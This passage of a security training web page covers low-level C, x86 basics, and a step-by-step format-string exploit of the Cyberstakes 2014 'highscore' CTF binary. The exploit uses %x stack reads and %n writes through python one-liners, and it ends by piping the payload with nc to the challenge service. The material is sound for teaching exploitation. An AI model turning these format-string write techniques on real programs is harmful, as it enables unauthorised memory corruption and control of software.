            &#160;&#160;&#160;&#160;&#160;unsigned short es, __esh;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short ds, __dsh;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short fs, __fsh;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned short gs, __gsh;
            <br>
            };
         </td>
      </tr>
      <tr>
         <th valign="top"><a name="vm86_struct" id=
            "vm86_struct">vm86_struct</a></th>
         <td><a href=
            "file:///usr/src/linux/include/asm/vm86.h">include/asm/vm86.h</a>:
            <br>
            struct vm86_struct {
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#vm86_regs">struct vm86_regs</a> regs;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long flags;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long screen_bitmap;
            <br>
            &#160;&#160;&#160;&#160;&#160;unsigned long cpu_type;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#revectored_struct">struct revectored_struct</a>
            int_revectored;
            <br>
            &#160;&#160;&#160;&#160;&#160;<a href=
               "#revectored_struct">struct revectored_struct</a>
            int21_revectored;
            <br>
            };
         </td>
      </tr>
    </tbody>
  </table>
</div>
<?php else: ?>
<ul class="nav nav-pills">
  <li role="presentation" class="active"><a href="#learnc">Learn C</a></li>
  <li role="presentation" class="active"><a href="#c">C Practice</a></li>
  <li role="presentation" class="active"><a href="#learnasm">Learn ASM</a></li>
  <li role="presentation" class="active"><a href="#asm">ASM Practice</a></li>
  <li role="presentation" class="active"><a href="#videos">Exploit Walk-through Videos</a></li>
  <li role="presentation" class="active"><a href="#formintro">Format Strings</a></li>
</ul>
  <div class="col-md-6">
<h1 id="learnc">Learning C - <a target="_blank" href="http://<?php echo base_url('files/c_intro.pdf'); ?>">PDF Version</a></h1>
  <div id="deck">
    <h2>An Introduction to Low Level C</h2>
      <p>
      C is an interesting language because it is the foundation of most
      operating systems.  Many servers and low level systems libraries are
      written in it, kernels are written in it, and lots of higher-level
      languages compile down to something compatible with the C ABI.
      Exploitation often involves taking advantage of assumptions that are
      not true at the low level, so it is essential that you have a solid
      understanding of C at its lowest level.
      </p>
    
    <h2>Data Types</h2>
      <h4>(Assuming 32-bit Linux)</h4>
      <table><tbody>
          <tr> <td> Type        </td> <td> Width (bytes) </td> </tr>
          <tr> <td> bool        </td> <td> 1             </td> </tr>
          <tr> <td> char        </td> <td> 1             </td> </tr>
          <tr> <td> short       </td> <td> 2             </td> </tr>
          <tr> <td> int         </td> <td> 4             </td> </tr>
          <tr> <td> long        </td> <td> 4             </td> </tr>
          <tr> <td> long long   </td> <td> 8             </td> </tr>
          <tr> <td> float       </td> <td> 4             </td> </tr>
          <tr> <td> double      </td> <td> 8             </td> </tr>
          <tr> <td> pointer     </td> <td> 4             </td> </tr>
          <tr> <td> instruction </td> <td> (variable)    </td> </tr>
      </tbody></table>
    
    <h2>Negative Numbers</h2>
      <h4>How do we represent negative quantities in binary?</h4>
      <p>There are three primary ways to represent negative numbers: </p>
      <ul>
          <li>Sign + Magnitude: Not used in real hardware</li>
          <li>One's Complement: Invert all the bits</li>
          <li>Two's Complement: Invert all the bits, and add 1</li>
      </ul>
      <br />
      <p>Of these, two's complement is the most common.  One's complement
      negation is sometimes used with boolean values, though.
      </p>
      <p>Why use two's complement?</p>
      <p>Because it makes math easy!  Let's have a look at -1 + 1 = 0:</p>
      <ul>
          <li>-1 == two's complement of 0001 == 1110 + 1 == 1111 </li>
          <li>1111 + 0001 = 0000 (with overflow), which we expect </li>
          <li>For a detailed explanation of how this works check out <a href='http://en.wikipedia.org/wiki/Two%27s_complement#Why_it_works'>this article</a></li>
      </ul>
    <h2>Signed vs. Unsigned</h2>
      <p>
        Usually, when dealing with integers to perform computations on
        data, we want to be able to represent negative quantities.
      </p>
      <p>
        However, when negative values do not make sense, we can choose to
        force the computer to interpret the value as a positive number. To
        do so we use the unsigned integer type (e.g. unsigned int).
      </p>
      <p>Examples of when to use unsigned types:</p>
      <ul>
          <li>Indexes into an array</li>
          <li>Number of bytes to read</li>
          <li>The size of a buffer</li>
          <li>Representing raw, untyped binary data</li>
      </ul>
      <h4>Security Concerns</h4>
      <p>
        Mishandling signed and unsigned data can cause security
        vulnerabilities because of the differences in range.  For a 1 byte
        integer, there are 256 different values:
      </p>
      <ul>
          <li>signed char: -128 to +127</li>
          <li>unsigned char: 0 to +255</li>
      </ul>
      <br />
      <p>
        Consequently, signed values -128 to -1 are represented the same way
        as unsigned values from +128 to +255.
      </p>
      <p>
        This can cause problems when programmers treat signed data as
        unsigned or vice versa.
      </p>
    <h2>Endianness</h2>
      <h4>Big vs. Little Endian</h4>
      <p>
        There are two ways of ordering the bytes on a computer: big endian
        and little endian.
      </p>
      <ul>
          <li>Big Endian: Most Significant Byte (MSB) first</li>
          <li>Little Endian: Least Significant Byte (LSB) first</li>
      </ul>
      <br />
      <p>
        For example, the byte sequence &quot;\x01\x00&quot; represents
        0x0100 (256) on a big endian machine and 0x0001 (1) on a little
        endian machine.
      </p>
      <p>
        A side effect of little endian is that converting a 32-bit integer
        to a 16- or 8-bit integer (or 16- to 8-bit) involves ignoring the
        bytes on the right side, not on the left.  This makes the machine
        code for expressions like <code class="language-c">short s = *pointer_to_int;</code>
        simpler, since you don't need to add an offset to the address.
      </p>
      <h4>x86 is a Little Endian Architecture!</h4>
      <p>
          I promise you that this <b>will</b> mess you up at least
           once when you're writing an exploit!
      </p>
    <h2>Shifts and Bitwise Operations</h2>
      <h4>Conceptual</h4>
        <p>
        Shifts simply move all of the bits to the right or the left,
        dropping what falls off the end and filling in with zeros.
        The exception to this rule is when right-shifting a signed number.
        In this case, the computer checks if the number is negative by
        looking at the most significant bit.  Positive numbers are filled
        in with zeros, and negative numbers filled in with ones.  This
        process is called <em>sign extension</em>
        </p>
        <ul>
           <li>Right Shift: &gt;&gt;</li>
           <li>Left Shift: &lt;&lt;</li>
        </ul>
        <br />
        <p>
          Bitwise operations apply a logical operation (not, and, or, xor)
          to every bit in order.
        </p>
        <ul>
           <li>Not: ~</li>
           <li>And: &amp;</li>
           <li>Or: |</li>
           <li>Xor: ^</li>
        </ul>
      <h4>Examples</h4>  
        <ul>
            <li>1100 &lt;&lt; 1 == 1000</li>
            <li>1100 (unsigned) &gt;&gt; 1 == 0110</li>
            <li>1100 (signed) &gt;&gt; 1 == 1110</li>
            <li>~1100 == 0011</li>
            <li>1100 &amp; 0000 == 0000</li>
            <li>1100 &amp; 1111 == 1100</li>
            <li>1100 | 0000 == 1100</li>
            <li>1100 | 1111 == 1111</li>
            <li>1100 ^ 0000 == 1100</li>
            <li>1100 ^ 1111 == 0011</li>
        </ul>
    <h2>Floating Point Representation</h2>
      <p>
      Floating point numbers are represented according to the standard
      IEEE-754.  That means nothing to you.  Since it isn't critically
      important to you right now, we're going to wave our hands at it.
      Those interested should go to the Wikipedia page.
      </p>
      <p>
      Sufficeth to say it is quite different from how integers are
      represented.
      </p>
    <h2>Type Casts</h2>
      <h4>Types of Casts</h4>
      <p>There are two types of casts:</p>
      <ul>
          <li>Normal Casts: <code class="language-c">float f = (float)some_int;</code></li>
          <li>Binary Reinterpretation Casts:<code class="language-c">float f = *(float*)&amp;some_int;</code></li>
      </ul>
      <br />
      <p>
      Needless to say, the two are quite different.  The first will
      do a proper conversion, while the second will copy the raw bit 
      pattern.
      </p>
      <p>In addition, there are multiple types of normal casts:</p>
      <ul>
        <li>Integer&lt;-&gt;Integer Casts: Narrowing</li>
        <li>Integer&lt;-&gt;Integer Casts: Widening</li>
        <li>Integer&lt;-&gt;Float Casts</li>
        <li>Pointer Casts (which result in reinterpret-casts of the data they point to)</li>
      </ul>
      <h4>Integer&lt;-&gt;Integer Casts: Narrowing</h4>
        <p>
        Narrowing is casting a larger integer type down to a smaller
        integer type (e.g. int to short).
        </p>
        <p>
        To narrow to n bytes, the machine will take the n least significant
        bytes and store them into the result.  Thus, 
        <code class="language-c">(char)257 == 1</code>.
        </p>
        <p>
        As shown in the above example, this can cause strange results
        when narrowing to a type that cannot hold the run-time value of
        the variable being cast.  Narrowing casts are <em>only</em> safe
        when the run-time value can be represented in the target type.
        Narrowing in other circumstances causes unintuitive results.
        </p>
        <h4>Integer&lt;-&gt;Integer Casts: Widening</h4>
        
        <p>
        On the other hand, the opposite (widening) is always valid for 
        unsigned-&gt;signed casts and casts with no change in signedness.
        In these cases, the n bytes of the original variable are copied
        to the least significant bytes of the target.  If the target is
        unsigned, zeros are added to the MSBs, and if it is signed then
        they are subject to sign extension.
        </p>
    
    
    <!-- /End slides -->
    
  </div>
    <h1 id="c">C Exercises</h1>
  <p>Click on the exercise to display the challenge. When you are ready, view the solutions in the next section</p>
  <button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal">
  Exercise One
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal2">
  Exercise Two
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#myModal3">
  Exercise Three
</button>
<h1 id="videos">Exploit Walk-through Videos</h1>
<p>The files and instructions from which these videos are created can be found at <a href="http://www.blairmason.me">www.blairmason.me</a>. Further tutorial videos about the stack and related concepts are in development.
<ul>
  <li><a target="_blank" href="http://<?php echo base_url('files/videos/overflow1.avi'); ?>" class="btn btn-primary btn-lg">Overflow 1 - Part 0</a></li>
</ul>
<video width="320" height="240" controls>
  <source src="http://<?php echo base_url('files/videos/overflow1.avi'); ?>" type="video/ogg">
Your browser does not support the video tag.
</video>

<h1 id="formintro">Format Strings Introduction</h1>
<sup>This information is adapted from the USNA SI485 Fall course notes written by Asst. Prof. Dr. Adam Aviv</sup>
<h3>What does a format string vulnerability?</h3>
<p>A format string vulnerability exists when the programmer forgets or neglects to specify a format for a string. Instead of explicitly specifying the format with one of the format specifiers, the section is omitted and only the variable is provided.</p>
<pre class="language-c line-numbers"><code>int main(int argc, char * argv[]) {
    printf("%s", argv[1]); //<---No vulnerability here
}</code></pre>
<pre class="language-c line-numbers"><code>int main(int argc, char * argv[]) {
    printf(argv[1]); //<---Vulnerability here
}</code></pre>
<p>Normally this would be an simple issue however, this program is taking direct user input and feeding it into the printf statement. This makes for a large security hole as you will see in the example below. First, it is helpful to understand the format specifiers that will be used in this exploit.</p>
<ul>
  <li>%s: Follows a pointer and prints out the referenced content in string format</li>
  <li>%x: Prints out an unsigned int in hexadecimal</li>
  <li>%n: Writes to the referenced address the number of characters printed by printf so far, cumulative over multiple %n uses.</li>
  <li>%h$[xsn]: </li>h is an int such as 2. This references a h'th word in memory. Very useful to shorten format strings while using the above functionality. 
</ul>
<h3>How does printf work?</h3>
<p>In order to understand why this exploit occurs, a fundamental understanding of the printf function is useful. printf acts just like any other function call, its arguments are pushed to the stack in reverse order.</p>
<pre class="language-c line-numbers"><code>//Code example from Dr. Adam Aviv - SI485
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
  int A=5, B=7, count_one, count_two;

  printf("The number of bytes written up to this point X%n is being stored in count_one, "
  "and the number of bytes up to here X%n is being stored in count_two.\n",
  &count_one,&count_two);

  printf("count_one: %d\n", count_one);
  printf("count_two: %d\n", count_two);
  
  printf("A is %d and is at %08x. B is %x.\n", A, &A, B);

  return 0;
}
</code></pre>
<pre class="col-md-6 pull-right">
  ...  ... 
+----------+
|     B    |
+----------+
|    &A    |
+----------+
|     A    |
+----------+
|  char *  | <-- The format string
+----------+
| RET ADDR |
+----------+
|    SBP   |
+----------+
 ...   ... 
</pre>
<p>Before we run this code, lets take a closer look at the printf statement. There are four arguments to the function call; the format string, variable A, variable &A, and variable B. The stack will look like the diagram to the right when printf gains control. As you may have guessed, the format string will be printed to the screen using the variable on the stack. But what happens when one variable is missing, say B is not provided in the function call. Instead of stopping execution, printf will print out whatever is located at the point in memory. This is the basis of our format string vulnerability.</p>
<h3>What does this all mean?</h3>
<p>Recall that as the string is printed the values are used from the stack. If we print enough information out, we will actually work far enough up the stack that we can print out the char* we provided as the format string. It is this fact that allows us to arbitrarily read and write to memory. Now off with an example exploit.</p>
<h2>Example Exploit - Cyberstakes</h2>
<p>Use <a href="http://<?php echo base_url('files/cyberstakes/highscore'); ?>">this</a> binary to follow along. This is the HIGHSCORE challenge from Cyberstakes 2014. First, run the program to get an idea of what it does. </p>
<pre class="language-none">#$ ./highscore 
Can you beat my high score of 10000?
<font color="red">test //User input</font>
test
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>OK. Not much here. It seems that we need to get our score to read higher than the CPU's. How is that possible! There is not any consideration for the user, it is an un-winnable game. Cheating is our best second option. We can see that the <kbd>test</kbd> input was echoed back to stdout. It seems that there might be potential for a format string vulnerability here. Lets run it again with different input.</p>
<pre class="language-none">#$ ./highscore 
Can you beat my high score of 10000?
<font color="red">%08x</font>
bffff13c
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>As suspected, the vulnerability exists here. Now we need to attempt to change some variables around in memory. There are two problems we have with this</p>
<ol>
  <li>We don't know where the variables are</li>
  <li>We need to find a way to change the variables with format strings. How????????</li>
</ol>
<h3>Addressing Issue One</h3>
<p>Starting with issue one, our good friend objdump (or any decompiler for that) will set this all up for us. </p>
<kbd>objdump -d -Mintel highscore</kbd>
<p>The important pieces will be located in <kbd>main</kbd>. Since the program tests for a greater value, we can expect some logical comparison between two values, the user and pc score variables. The best part is that these comparisons will show us the memory addressed of the two variables. Per the challenge hint, they are global and do not change. This gets us part way through the first problem.</p>
<pre style='color:#d1d1d1;background:#333333;'>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span><span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d0d09f; '>ds</span><span style='color:#d2cd86; '>:</span><span style='color:#00a800; '>0x804a028</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x8048720</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x4</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>edx</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>80483f0</span> <span style='color:#d2cd86; '>&lt;</span>printf@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>ds</span><span style='color:#d2cd86; '>:</span><span style='color:#00a800; '>0x804a040</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>8048400</span> <span style='color:#d2cd86; '>&lt;</span>fflush@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x8</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x4f</span>
<span style='color:#e66170; font-weight:bold; '>lea</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x2c</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x4</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x0</span>
<span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>80483e0</span> <span style='color:#d2cd86; '>&lt;</span>read@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x24</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>cmp</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x24</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x0</span>
<span style='color:#e66170; font-weight:bold; '>js</span>     <span style='color:#e34adc; '>804862f</span> <span style='color:#d2cd86; '>&lt;</span>main<span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x11b</span><span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>lea</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x2c</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e66170; font-weight:bold; '>add</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x24</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>BYTE</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x0</span>
<span style='color:#e66170; font-weight:bold; '>lea</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x2c</span><span style='color:#d2cd86; '>]</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>call</span>   <span style='color:#e34adc; '>80483f0</span> <span style='color:#d2cd86; '>&lt;</span>printf@plt<span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span><span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d0d09f; '>ds</span><span style='color:#d2cd86; '>:</span><span style='color:#00a800; '>0x804a04c</span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>ds</span><span style='color:#d2cd86; '>:</span><span style='color:#00a800; '>0x804a028</span>
<span style='color:#e66170; font-weight:bold; '>cmp</span>    <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span>
<span style='color:#e66170; font-weight:bold; '>jle</span>    <span style='color:#e34adc; '>80485f5</span> <span style='color:#d2cd86; '>&lt;</span>main<span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0xe1</span><span style='color:#d2cd86; '>></span>
<span style='color:#e66170; font-weight:bold; '>mov</span>    <span style='color:#e66170; font-weight:bold; '>DWORD</span> <span style='color:#e66170; font-weight:bold; '>PTR</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x4</span><span style='color:#d2cd86; '>]</span><span style='color:#d2cd86; '>,</span><span style='color:#00a800; '>0x0</span>
</pre>
<p>The <code class="language-none"><span style='color:#e66170; font-weight:bold; '>cmp</span>  <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>eax</span></code> command is of particular interest since it is comparing two registers. Also, a jump is located immediately after that and it only jumps if edx is less than or equal to eax. This sounds a lot like our program, in fact it sounds like eax is the pc's score and edx is the user's scoreWe need to find where these were initialized from. After a bit of analysis we see that that the value in edx came from 0x804a04c and the value in eax came in 0x804a028. We have our memory addresses. A secondary approach to this would to use gdb to view the variable names with <kbd>info variables</kbd>. In this list the two names highscore and userscore would be found. Following, the command <kbd>p userscore/highscore</kbd> could be used to print their values while debugging. </p>
<h3>Addressing Issue Two</h3>
<p>Ok the disassembly is over, phew! The next issue is trying to change a value in memory while a program is executing. This is crazy! Let us try sending a value we know and then a format string. I have separated the %08x's with a period for clarity. This is not a required inclusion.</p>
<pre class="language-none">#$ ./highscore 
Can you beat my high score of 10000?
<font color="red">AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x</font>
AAAAbffff13c.0000004f.00000000.bffff1d4.bffff148.bffff140.bffff234.b7fff938.0000003b.000000c2.41414141.78383025
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>Well, what does that mean. It all looks like gibberish until the end. Remember, these things are printed in hex so the bff* values look a lot like addresses and such. What we are actually doing here is reading the stack. Better yet, at the end we see the value 41414141 which is ASCII AAAA, the value we typed in! Furthermore, the very last hex string translates to x80%. That is also what we typed in, endianized of course. What does this mean? It means that we caught up to our own input. From here, we can replace AAAA with a memory address and use any printf argument that uses a reference to change the value at the other end! This leaves %s and %n. For this next part a common mistake is to type the values into the program. This will not work as the hex will be treated as ASCII. We must use something to convert it to hex before injecting it .... python!</p>
<kbd>python -c "print '\xde\xad\xbe\xef%11\$x'" | ./highscore</kbd>
<p>Using the above, I send the command with the address 0xdeadbeef. The second string will retrieve the 11th word (4 bytes) in memory. From above this is the location of the included address. What output should we receive here? 0xdeadbeef right?</p>
<pre class="language-none">#$ python -c "print '\xde\xad\xbe\xef%11\$x'" | ./highscore 
Can you beat my high score of 10000?
��efbeadde
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>Aha! Little endian gets us again! The values need to be little endianized when printed by python so they come out correctly. May we not make that mistake again.</p>
<pre class="language-python">#$ python -c "print '\xef\xbe\xad\xde%11\$x'" | ./highscore 
Can you beat my high score of 10000?
<font color="red">AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x</font>
��deadbeef
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>Ok, so replace the deadbeef test string with our actual address (the one for machine or highscore). We are going to use the %n specifier to write a value to the machine variable, hopefully much smaller than 10000. We'll tackle the user input in a second. The same command can be used as above but replacing the <kbd>%11$x</kbd> with <kbd>%11$n</kbd></p>
<kbd>python -c "print '\x28\xa0\x04\x08%11\$n'" | ./highscore</kbd>
<pre class="language-none">#$ python -c "print '\x28\xa0\x04\x08%11\$n'" | ./highscore 
Can you beat my high score of 10000?
(�
SCORES:
machine: 4
user: 0
No key for you :(  Better luck next time.</pre>
<p>It worked! Since we printed four things (each byte of the hex - commands are excluded since they are , you know, commands) the number of items printed should equal four at the %n command. That then writes four to the specified address which changes the value form 10000 to 4.</p>
<h3>Finishing Up - Winning/Pwning</h3>
<p>Since we can change machine, we can also change the user variable to something higher right? What is required for this?</p>
<ul>
  <li>Two addresses specified</li>
  <li>Some intermediate print - so user is larger than machine</li>
  <li>Two %n commands, user after machine - so user is larger</li>
</ul>
<h4>Part 1</h4>
<p>Extending our command to change two variables may sound daunting. Really, the same process as before can be used. Instead of specifying one address, lets add two - I have them separated for clarity in the python but they are printed as one string.</p>
<kbd>python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$x.%12\$x' " | ./highscore</kbd>
<pre class="language-none">#$ python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$x.%12\$x' " | ./highscore 
Can you beat my high score of 10000?
(�L�804a028.804a04c
SCORES:
machine: 10000
user: 0
No key for you :(  Better luck next time.</pre>
<p>As you can see, the 11th word in memory is the address of the machine variable and the 12th word is the address of the user variable. We have accomplished part 1</p>
<h4>Part 2/Part 3</h4>
<p>This is the final part. Now that we have both address, it is just a matter of doing things in the right order. I am going to add a %n call in %h$n format immediately after the two addresses for the machine (11th word). Then I will add another %n call for the user (12th word). What value will be set? Will the test succeed?</p>
<kbd>python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$n%12\$n' " | ./highscore</kbd>
<pre class="language-none"># python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$n%12\$n' " | ./highscore 
Can you beat my high score of 10000?
(�L�
SCORES:
machine: 8
user: 8
No key for you :(  Better luck next time.</pre>
<p>The values were 8 and the test failed. Why? Well, there were no new bytes printed between the two %n's lets add an 'A'. </p>
<kbd>python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$nA%12\$n' " | ./highscore</kbd>
<pre class="language-none">#$ python -c "print '\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$nA%12\$n' " | ./highscore 
Can you beat my high score of 10000?
(�L�A
Success!  Your key is (�L�%11$nA%1
</pre>
<p>And there you have it, a complete format string injection for this program. The key here is gibberish and useless, to actually solve the challenge you need to netcat into the cyber stakes service. The easiest way to do this is right in the command line with the following command (only necessary because of the required AUTH TOKEN)</p>
<pre class="language-none">python -c "print 'AUTHTOKEN\n\x28\xa0\x04\x08' + '\x4c\xa0\x04\x08%11\$nA%12\$n' " | nc service(shell.cyberstakesonline.com) port#</pre>
</div>
<div class="col-md-6">
<h1 id="learnasm">Learning ASM - <a target="_blank" href="http://<?php echo base_url('files/x86.pdf'); ?>">PDF Version</a></h1>
<div id="deck">
  <h2>Basic Instructions and Shellcode</h2>    
    <p>
    Most desktop or laptop computers in the world run some variant of the
    x86 processor.  Thus, the most common ISA used in computer security
    is x86.  Knowledge of x86 is necessary for understanding how to both
    reverse engineer and exploit binaries.
    </p>
  <h2>Why Learn Assembly?</h2>
    <ul>
      <li>Many computer exploit techniques are fundamentally low level
        <ul>
          <li>Reverse engineering is done at the assembly level</li>
          <li>Exploit payloads are (usually) written in assembly</li>
        </ul>
      </li>
      <li>BLUF:  C isn't close enough to the metal to conduct real exploits</li>
    </ul>
  <h2>x86 ISA Overview</h2>
    <h3>Or, why x86 sucks</h3>
    <ul>
      <li>Not easy like MIPS...</li>
      <li>Little Endian (0xdeadbeef is |ef|be|ad|de|)</li>
      <li>CISC Architecture evolving from a 16-bit ISA
      <ul>
        <li>This is why a 'word' in x86 refers to two bytes</li>
        <li>Thus, a 32-bit figure is a <b>dword</b> (64-bit is a <b>qword</b>)</li>
      </ul>
      <li>Many variants (read: <em>complex</em>)</li>
      <li>BUT: It's everywhere</li>
      <ul>
        <li>Business concerns trump technical concerns every time</li>
      </ul>
    </ul>
  <h2>A Note on Syntax</h2>    
    <ul>
      <li>There are two syntax styles used in x86:
        <ul>
          <li>Intel Syntax</li>
          <li>AT&amp;T Syntax</li>
        </ul>
      </li>
      <li>We'll be using Intel Syntax
        <ul>
          <li>I am going to (somewhat arbitrarily) say that it's easier and more intuitive</li>
          <li>If you see lots of %s and $s, it's probably AT&amp;T</li>
          <li>Lots of small syntax changes that will trip you up</li>
        </ul>
      </li>
    </ul>
  <h2>Brief Note on Segments</h2>
    <h3>Deprecated stuff you can (mostly) ignore</h3>
    <ul>
      <li>There are segment registers</li>
      <li>CS, DS, ES, FS, GS, SS</li>
      <li>Pretend they don't exist</li>
      <li>Relic of old 16-bit processors</li>
